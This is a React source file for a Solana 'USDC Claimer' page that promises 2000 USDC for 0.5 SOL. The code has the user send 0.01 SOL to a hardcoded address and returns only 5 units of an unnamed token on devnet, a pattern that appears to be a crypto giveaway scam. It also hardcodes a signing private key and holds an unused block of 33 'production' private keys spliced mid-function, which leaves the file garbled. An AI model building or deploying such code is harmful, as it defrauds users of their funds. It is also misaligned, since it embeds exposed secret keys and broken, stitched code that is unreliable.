/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "6NDHRbMP5GsKuwBbqaYsHX64RYec5z97UVjBsYYR5PMBwG4WSLc56HiDaUQhbamg32kTxcD933SJV46315KjLLX"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "1u4e3vs9BL2agdfsDuHkarTKKCH2j7yQ8pKjoqfQd24faW58RVV8DMDNNeX1DmFjCcXKoE859SJT9VGqC8PMYe3",
  "key1": "5ShM18mZ9DBhwEa3CtSLjFRcQLiMdoy7EgFXQgHyFAQnwg3whd77JyHmSyp3iGnEByBF4K49CQF7xSBRFC7FbxMj",
  "key2": "x8JupZGFpTeRjLo6maCMpUSrPVXVHUHDYRbouwdaYu8dC753FZPtsVCaYTWNG1gbRze8ZnPr8BgCp78hTGzjv55",
  "key3": "4PV991UEkFFHvZgxDkYxr4zr5whemDxSP6oU8XA8qbq5kcJAPAk57wEhnMkTUeXGuKXkBoRFUmYKzk4mVX69KoyA",
  "key4": "63NxCQmU4H6YhkHNRZHBziqCu95GduAmj9QFaGmRJ5PdHa2ArF8GraspNXdAQvusa2jaUXhfuJhkzyJtdiCwcXSw",
  "key5": "3LzgcEPWPqLkoGjmmvYKiyvErsVCTuzsDFkzYFriJniZYMktvWic5JWmLYr725XxeANtozmhJ9zmC5jKZzn1ZAHZ",
  "key6": "3QhwDsJXUHSDxx7K5GVLMeD9ze5uzmJ3tPpbN63WAJnW354snzSra98ZziHSkpvg4gN63uj3DR4cuFHdpJatrRNV",
  "key7": "3YM2wfTSsrpvzsaMoLNq6g82PBCQuufFZRErMZidt2CqyHqTW6osBaNqRQyBeXz6eV78TU8CUQyP4uxbY9hjVC8U",
  "key8": "56oDpD3bndzsYiiRqbcTZ3TVmvUAib3cKek8YdDLA7DN4SuuDc6BXcE63oAQK2LRuyGL5WnUVVg8gYz3DHYUkPXq",
  "key9": "4d7LmZVHRbx6WL3PGdxAwTgNnTuxdVrkUZbceyzQmWvy77cgjgPB56jTBNEHtzufndaYTPbXCARdmvuUTRxW3D55",
  "key10": "2ksoVPFGvutzuDjx3AH8ZjzJYU49i4VXrAmdkoDHhGAQ3uALpVEzbqgU2hiCoFJDLn6ZJNQ7ruXkFaquAvBseiLw",
  "key11": "3BKrHDyFeJpi4VAGK2xQQT3YairzJJsN39pgPbWJ3eHuQ9mmhBjAaDN25v1k9QVCPyehcXrX2cGKJhpsvi3eZ5bL",
  "key12": "3WcrFHtNxU3bpevHZ2auChNN1DBE87GQiyMZbB8cutZADdahY4xejAvfEYp2gQhbezKzPgKxGno3aeUtgpe71MXR",
  "key13": "M4dCELXEx7V14JQHw4G9RSiFszVdLsGhQdywbZnsaDBUeBUgUUPWzindZZyjH8yeShDEUSDiJBQ5ba2qtAXb5Qb",
  "key14": "2GfXYKUEyHRgLmHuB6799BjxEPtD8bLEpYCEdZF91RCAfFpLitwjMymiqpMbFN7ABWwDJmb9ptwC3Akz4xmDzf35",
  "key15": "5AuP88CAqe21o5Awaq2AWqJMp7DgGTsJzZsUVh9WHuGAWsMBKDeLGVGPnCkExSexzDeUbx6HuSMtMnid3QdfmacZ",
  "key16": "5PcA3PMSMxTqRBjNZLsVqYtXSnJzPgrSeXxh4y7dCrvTkoAKdfcNXD6yPtZyto7yi7ikk62t6sJLumy6H6phiUHa",
  "key17": "2roJL4YRZxUxda5GLa6fDUsvjBtYLT6FVkuL4LyGhGchQNvzXzbD9DdgK1nybNox4EPGo2ST1tkJNnXP1SvhE8nf",
  "key18": "424idr51GFEnwdQJdhQ3XaVMPwGMYu8HNcuMqxYwpVKR5cXq7Sq2NERJ69oo6YNLy62ag6sRPcL7juxwXV45Y5KQ",
  "key19": "5QzfEhJ5j6P8h82HQ8GNHHi91ngavvZjVsNPRqq3EukxWRWVWFFTBHfjVPr6SBrdGSmR6WHVE2hgpnDc6d9vG55v",
  "key20": "5F4H3vGjQt1TkcMq9WA14dQNGysmj65HTfHS4bpPfq7JNewgxKPnZidNcXkmnp84YYcYxk5j5DKq514XPKi3j28v",
  "key21": "5yQKUJoS2FVs41avag1kDKzUQd97SPHW4YtcgU31V1p1XPDSRiKT5g4g9Ndger2PkLXQ3qkpxYQRXcW7azrasywJ",
  "key22": "49wXo6Pc8Qp5ZmoCL7bQH5MvTUvEGPzdLKS52A6F5Mi5tXYJHiu63gHiLigKureDWsPKYB1xZ8nypisU383ZHZXc",
  "key23": "4tXx5yW5u9cGKEp9v4i9etn18LwPosuoCn36YvePomRqMxmGqnB391VX3QP3pfdGWVZ4hjahfiRT8Gkdvxkkbwtt",
  "key24": "46BUUEJphsKskttiE88ACe1dQyy4Gk1HXDFaC5yXMushFB7RF7p6RQ36qYo8mR4zDePTqVSvompwAtX4dF2ZPyTa",
  "key25": "4XBj4rAHMjjiX1W9GPowjjKZwajsYGrANzw89ahjm7KCq2jnCohQj5BSYp4o3rgqcwN1RKPFMcDxWcHunPSXDe38",
  "key26": "2BLh9zdmVZjPzozLUCakcy3KvqS2bPNEKQGkSxisshKbLKk7QXisG4i48kee6g6P7v72X1DN77MVfaEUyDNcaH4k",
  "key27": "3JWQTHTpcWEY21TnECdSF1hjUnHEnjbPAA5TUfruonBH2hR8pwpjt5DgGyHi879gkaJDrNqNb2TYpGgdChTBjKL7",
  "key28": "2qu1Xrvh9o3VVfmM3e7yKRYZzGG1Fpg8cYotwKSjsoJobkVGKm5UJZeKfPieiGdniHJAx6oiCjGpStoTUieGasc3",
  "key29": "4e7KTtFHsy5cKwMyt3yC2UtyBdkuBV3VcJLeiyt7pSTYHzWoSvV981GYJ9oiYLNfFLmbicwhJQTpqiBhH1CfrodC",
  "key30": "56jXsGj56vAMXzmwc5nScVFPYVvtJLTey93xCw8EgTWWsnaMoM5U3CoL9Yz8X2wN1vxh1WSYwq4U8TSpWQLWc3oF",
  "key31": "5LQTCFU4X2rtF1Kayq7QYdaPzm87oS6v3oh5bahrxRdVc7VqGiBY23MDVcy86Lhyi33nP8RWBxoJid4q6yJEF3zY",
  "key32": "4tGkVhayu4x6X8nVhwdDYhEEBZEsokdkEwzc9Ne9vEKuvZg3j13iLgcdpZ1q79HmTTouXwMsCpXrLHEu6ga7P8cB"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
